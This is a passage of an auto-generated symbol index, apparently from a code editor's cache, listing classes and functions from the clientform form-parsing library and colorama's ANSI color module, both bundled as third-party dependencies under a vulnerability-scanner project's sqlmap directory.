        "peekOfCode": "class TextControl(ScalarControl):\n    \"\"\"Textual input control.\n    Covers:\n    INPUT/TEXT\n    INPUT/PASSWORD\n    INPUT/HIDDEN\n    TEXTAREA\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "FileControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class FileControl(ScalarControl):\n    \"\"\"File upload with INPUT TYPE=FILE.\n    The value attribute of a FileControl is always None.  Use add_file instead.\n    Additional public method: add_file\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        self._value = None\n        self._upload_data = []\n    def is_of_kind(self, kind): return kind == \"file\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "IsindexControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class IsindexControl(ScalarControl):\n    \"\"\"ISINDEX control.\n    ISINDEX is the odd-one-out of HTML form controls.  In fact, it isn't really\n    part of regular HTML forms at all, and predates it.  You're only allowed\n    one ISINDEX per HTML document.  ISINDEX and regular form submission are\n    mutually exclusive -- either submit a form, or the ISINDEX.\n    Having said this, since ISINDEX controls may appear in forms (which is\n    probably bad HTML), ParseFile / ParseResponse will include them in the\n    HTMLForm instances it returns.  You can set the ISINDEX's value, as with\n    any other control (but note that ISINDEX controls have no name, so you'll",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "IgnoreControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class IgnoreControl(ScalarControl):\n    \"\"\"Control that we're not interested in.\n    Covers:\n    INPUT/RESET\n    BUTTON/RESET\n    INPUT/BUTTON\n    BUTTON/BUTTON\n    These controls are always unsuccessful, in the terminology of HTML 4 (ie.\n    they never require any information to be returned to the server).\n    BUTTON/BUTTON is used to generate events for script embedded in HTML.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "Item",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class Item:\n    def __init__(self, control, attrs, index=None):\n        label = _get_label(attrs)\n        self.__dict__.update({\n            \"name\": attrs[\"value\"],\n            \"_labels\": label and [label] or [],\n            \"attrs\": attrs,\n            \"_control\": control,\n            \"disabled\": \"disabled\" in attrs,\n            \"_selected\": False,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ListControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class ListControl(Control):\n    \"\"\"Control representing a sequence of items.\n    The value attribute of a ListControl represents the successful list items\n    in the control.  The successful list items are those that are selected and\n    not disabled.\n    ListControl implements both list controls that take a length-1 value\n    (single-selection) and those that take length >1 values\n    (multiple-selection).\n    ListControls accept sequence values only.  Some controls only accept\n    sequences of length 0 or 1 (RADIO, and single-selection SELECT).",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "RadioControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class RadioControl(ListControl):\n    \"\"\"\n    Covers:\n    INPUT/RADIO\n    \"\"\"\n    def __init__(self, type, name, attrs, select_default=False, index=None):\n        attrs.setdefault(\"value\", \"on\")\n        ListControl.__init__(self, type, name, attrs, select_default,\n                             called_as_base_class=True, index=index)\n        self.__dict__[\"multiple\"] = False",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "CheckboxControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class CheckboxControl(ListControl):\n    \"\"\"\n    Covers:\n    INPUT/CHECKBOX\n    \"\"\"\n    def __init__(self, type, name, attrs, select_default=False, index=None):\n        attrs.setdefault(\"value\", \"on\")\n        ListControl.__init__(self, type, name, attrs, select_default,\n                             called_as_base_class=True, index=index)\n        self.__dict__[\"multiple\"] = True",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "SelectControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class SelectControl(ListControl):\n    \"\"\"\n    Covers:\n    SELECT (and OPTION)\n    OPTION 'values', in HTML parlance, are Item 'names' in ClientForm parlance.\n    SELECT control values and labels are subject to some messy defaulting\n    rules.  For example, if the HTML representation of the control is:\n    <SELECT name=year>\n      <OPTION value=0 label=\"2002\">current year</OPTION>\n      <OPTION value=1>2001</OPTION>",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "SubmitControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class SubmitControl(ScalarControl):\n    \"\"\"\n    Covers:\n    INPUT/SUBMIT\n    BUTTON/SUBMIT\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        # IE5 defaults SUBMIT value to \"Submit Query\"; Firebird 0.6 leaves it\n        # blank, Konqueror 3.1 defaults to \"Submit\".  HTML spec. doesn't seem",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ImageControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class ImageControl(SubmitControl):\n    \"\"\"\n    Covers:\n    INPUT/IMAGE\n    Coordinates are specified using one of the HTMLForm.click* methods.\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        SubmitControl.__init__(self, type, name, attrs, index)\n        self.readonly = False\n    def _totally_ordered_pairs(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "PasswordControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class PasswordControl(TextControl): pass\nclass HiddenControl(TextControl): pass\nclass TextareaControl(TextControl): pass\nclass SubmitButtonControl(SubmitControl): pass\ndef is_listcontrol(control): return control.is_of_kind(\"list\")\nclass HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "HiddenControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class HiddenControl(TextControl): pass\nclass TextareaControl(TextControl): pass\nclass SubmitButtonControl(SubmitControl): pass\ndef is_listcontrol(control): return control.is_of_kind(\"list\")\nclass HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many\n    choices, and files to be uploaded.  Some controls can be clicked on to",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "TextareaControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class TextareaControl(TextControl): pass\nclass SubmitButtonControl(SubmitControl): pass\ndef is_listcontrol(control): return control.is_of_kind(\"list\")\nclass HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many\n    choices, and files to be uploaded.  Some controls can be clicked on to\n    submit the form, and clickable controls' values sometimes include the",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "SubmitButtonControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class SubmitButtonControl(SubmitControl): pass\ndef is_listcontrol(control): return control.is_of_kind(\"list\")\nclass HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many\n    choices, and files to be uploaded.  Some controls can be clicked on to\n    submit the form, and clickable controls' values sometimes include the\n    coordinates of the click.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "HTMLForm",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many\n    choices, and files to be uploaded.  Some controls can be clicked on to\n    submit the form, and clickable controls' values sometimes include the\n    coordinates of the click.\n    Forms can be filled in with data to be returned to the server, and then\n    submitted, using the click method to generate a request object suitable for",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "compress_text",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def compress_text(text): return _compress_re.sub(\" \", text.strip())\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)\n    if isinstance(value, six.text_type):\n        value = value.encode(\"utf8\")\n    return _urllib.parse.quote_plus(value)\n# This version of urlencode is from my Python 1.5.2 back-port of the",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "normalize_line_endings",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)\n    if isinstance(value, six.text_type):\n        value = value.encode(\"utf8\")\n    return _urllib.parse.quote_plus(value)\n# This version of urlencode is from my Python 1.5.2 back-port of the\n# Python 2.1 CVS maintenance branch of urllib.  It will accept a sequence",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "urlencode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def urlencode(query,doseq=False,):\n    \"\"\"Encode a sequence of two-element tuples or dictionary into a URL query \\\nstring.\n    If any values in the query arg are sequences and doseq is true, each\n    sequence element is converted to a separate parameter.\n    If the query arg is a sequence of two-element tuples, the order of the\n    parameters in the output will match the order of parameters in the\n    input.\n    \"\"\"\n    if hasattr(query,\"items\"):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "unescape",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def unescape(data, entities, encoding=DEFAULT_ENCODING):\n    if data is None or \"&\" not in data:\n        return data\n    if isinstance(data, six.string_types):\n        encoding = None\n    def replace_entities(match, entities=entities, encoding=encoding):\n        ent = match.group()\n        if ent[1] == \"#\":\n            return unescape_charref(ent[2:-1], encoding)\n        repl = entities.get(ent)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "unescape_charref",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def unescape_charref(data, encoding):\n    name, base = data, 10\n    if name.startswith(\"x\"):\n        name, base= name[1:], 16\n    elif not name.isdigit():\n        base = 16\n    try:\n        return _unichr(int(name, base))\n    except:\n        return data",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "get_entitydefs",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def get_entitydefs():\n    from codecs import latin_1_decode\n    entitydefs = {}\n    try:\n        _html_entities.name2codepoint\n    except AttributeError:\n        entitydefs = {}\n        for name, char in _html_entities.entitydefs.items():\n            uc = latin_1_decode(char)[0]\n            if uc.startswith(\"&#\") and uc.endswith(\";\"):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "issequence",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def issequence(x):\n    try:\n        x[0]\n    except (TypeError, KeyError):\n        return False\n    except IndexError:\n        pass\n    return True\ndef isstringlike(x):\n    try: x+\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "isstringlike",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def isstringlike(x):\n    try: x+\"\"\n    except: return False\n    else: return True\ndef choose_boundary():\n    \"\"\"Return a string usable as a multipart boundary.\"\"\"\n    # follow IE and firefox\n    nonce = \"\".join([str(random.randint(0, sys.maxsize-1)) for i in (0,1,2)])\n    return \"-\"*27 + nonce\n# This cut-n-pasted MimeWriter from standard library is here so can add",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "choose_boundary",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def choose_boundary():\n    \"\"\"Return a string usable as a multipart boundary.\"\"\"\n    # follow IE and firefox\n    nonce = \"\".join([str(random.randint(0, sys.maxsize-1)) for i in (0,1,2)])\n    return \"-\"*27 + nonce\n# This cut-n-pasted MimeWriter from standard library is here so can add\n# to HTTP headers rather than message body when appropriate.  It also uses\n# \\r\\n in place of \\n.  This is a bit nasty.\nclass MimeWriter:\n    \"\"\"Generic MIME writer.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ParseResponseEx",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def ParseResponseEx(response,\n                    select_default=False,\n                    form_parser_class=FormParser,\n                    request_class=_urllib.request.Request,\n                    entitydefs=None,\n                    encoding=DEFAULT_ENCODING,\n                    # private\n                    _urljoin=_urllib.parse.urljoin,\n                    _urlparse=_urllib.parse.urlparse,\n                    _urlunparse=_urllib.parse.urlunparse,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ParseFileEx",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def ParseFileEx(file, base_uri,\n                select_default=False,\n                form_parser_class=FormParser,\n                request_class=_urllib.request.Request,\n                entitydefs=None,\n                encoding=DEFAULT_ENCODING,\n                # private\n                _urljoin=_urllib.parse.urljoin,\n                _urlparse=_urllib.parse.urlparse,\n                _urlunparse=_urllib.parse.urlunparse,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ParseResponse",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def ParseResponse(response, *args, **kwds):\n    \"\"\"Parse HTTP response and return a list of HTMLForm instances.\n    The return value of urllib2.urlopen can be conveniently passed to this\n    function as the response parameter.\n    ClientForm.ParseError is raised on parse errors.\n    response: file-like object (supporting read() method) with a method\n     geturl(), returning the URI of the HTTP response\n    select_default: for multiple-selection SELECT controls and RADIO controls,\n     pick the first item as the default if none are selected in the HTML\n    form_parser_class: class to instantiate and use to pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ParseFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def ParseFile(file, base_uri, *args, **kwds):\n    \"\"\"Parse HTML and return a list of HTMLForm instances.\n    ClientForm.ParseError is raised on parse errors.\n    file: file-like object (supporting read() method) containing HTML with zero\n     or more forms to be parsed\n    base_uri: the URI of the document (note that the base URI used to submit\n     the form will be that given in the BASE element if present, not that of\n     the document)\n    For the other arguments and further details, see ParseResponse.__doc__.\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "disambiguate",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def disambiguate(items, nr, **kwds):\n    msgs = []\n    for key, value in kwds.items():\n        msgs.append(\"%s=%r\" % (key, value))\n    msg = \" \".join(msgs)\n    if not items:\n        raise ItemNotFoundError(msg)\n    if nr is None:\n        if len(items) > 1:\n            raise AmbiguityError(msg)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "is_listcontrol",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "def is_listcontrol(control): return control.is_of_kind(\"list\")\nclass HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many\n    choices, and files to be uploaded.  Some controls can be clicked on to\n    submit the form, and clickable controls' values sometimes include the\n    coordinates of the click.\n    Forms can be filled in with data to be returned to the server, and then",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "__all__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "__all__ = ['AmbiguityError', 'CheckboxControl', 'Control',\n           'ControlNotFoundError', 'FileControl', 'FormParser', 'HTMLForm',\n           'HiddenControl', 'IgnoreControl', 'ImageControl', 'IsindexControl',\n           'Item', 'ItemCountError', 'ItemNotFoundError', 'Label',\n           'ListControl', 'LocateError', 'Missing', 'ParseError', 'ParseFile',\n           'ParseFileEx', 'ParseResponse', 'ParseResponseEx','PasswordControl',\n           'RadioControl', 'ScalarControl', 'SelectControl',\n           'SubmitButtonControl', 'SubmitControl', 'TextControl',\n           'TextareaControl', 'XHTMLCompatibleFormParser']\ntry:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "sgmllib.charref",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "sgmllib.charref = re.compile(\"&#(x?[0-9a-fA-F]+)[^0-9a-fA-F]\")\n# HTMLParser.HTMLParser is recent, so live without it if it's not available\n# (also, sgmllib.SGMLParser is much more tolerant of bad HTML)\ntry:\n    import HTMLParser\nexcept ImportError:\n    HAVE_MODULE_HTMLPARSER = False\nelse:\n    HAVE_MODULE_HTMLPARSER = True\ntry:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "VERSION = \"0.2.10\"\nCHUNK = 1024  # size of chunks fed to parser, in bytes\nDEFAULT_ENCODING = \"latin-1\"\nclass Missing: pass\n_compress_re = re.compile(r\"\\s+\")\ndef compress_text(text): return _compress_re.sub(\" \", text.strip())\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "CHUNK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "CHUNK = 1024  # size of chunks fed to parser, in bytes\nDEFAULT_ENCODING = \"latin-1\"\nclass Missing: pass\n_compress_re = re.compile(r\"\\s+\")\ndef compress_text(text): return _compress_re.sub(\" \", text.strip())\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "DEFAULT_ENCODING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "DEFAULT_ENCODING = \"latin-1\"\nclass Missing: pass\n_compress_re = re.compile(r\"\\s+\")\ndef compress_text(text): return _compress_re.sub(\" \", text.strip())\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)\n    if isinstance(value, six.text_type):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "_compress_re",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "_compress_re = re.compile(r\"\\s+\")\ndef compress_text(text): return _compress_re.sub(\" \", text.strip())\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)\n    if isinstance(value, six.text_type):\n        value = value.encode(\"utf8\")\n    return _urllib.parse.quote_plus(value)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "#FormParser",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "#FormParser = XHTMLCompatibleFormParser  # testing hack\n#FormParser = RobustFormParser  # testing hack\ndef ParseResponseEx(response,\n                    select_default=False,\n                    form_parser_class=FormParser,\n                    request_class=_urllib.request.Request,\n                    entitydefs=None,\n                    encoding=DEFAULT_ENCODING,\n                    # private\n                    _urljoin=_urllib.parse.urljoin,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "#FormParser",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "#FormParser = RobustFormParser  # testing hack\ndef ParseResponseEx(response,\n                    select_default=False,\n                    form_parser_class=FormParser,\n                    request_class=_urllib.request.Request,\n                    entitydefs=None,\n                    encoding=DEFAULT_ENCODING,\n                    # private\n                    _urljoin=_urllib.parse.urljoin,\n                    _urlparse=_urllib.parse.urlparse,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "AnsiCodes",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "class AnsiCodes(object):\n    def __init__(self):\n        # the subclasses declare class attributes which are numbers.\n        # Upon instantiation we define instance attributes, which are the same\n        # as the class attributes but wrapped with the ANSI escape sequence\n        for name in dir(self):\n            if not name.startswith('_'):\n                value = getattr(self, name)\n                setattr(self, name, code_to_chars(value))\nclass AnsiCursor(object):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "AnsiCursor",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "class AnsiCursor(object):\n    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "AnsiFore",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "class AnsiFore(AnsiCodes):\n    BLACK           = 30\n    RED             = 31\n    GREEN           = 32\n    YELLOW          = 33\n    BLUE            = 34\n    MAGENTA         = 35\n    CYAN            = 36\n    WHITE           = 37\n    RESET           = 39",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "AnsiBack",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "class AnsiBack(AnsiCodes):\n    BLACK           = 40\n    RED             = 41\n    GREEN           = 42\n    YELLOW          = 43\n    BLUE            = 44\n    MAGENTA         = 45\n    CYAN            = 46\n    WHITE           = 47\n    RESET           = 49",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "AnsiStyle",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "class AnsiStyle(AnsiCodes):\n    BRIGHT    = 1\n    DIM       = 2\n    NORMAL    = 22\n    RESET_ALL = 0\nFore   = AnsiFore()\nBack   = AnsiBack()\nStyle  = AnsiStyle()\nCursor = AnsiCursor()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "code_to_chars",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
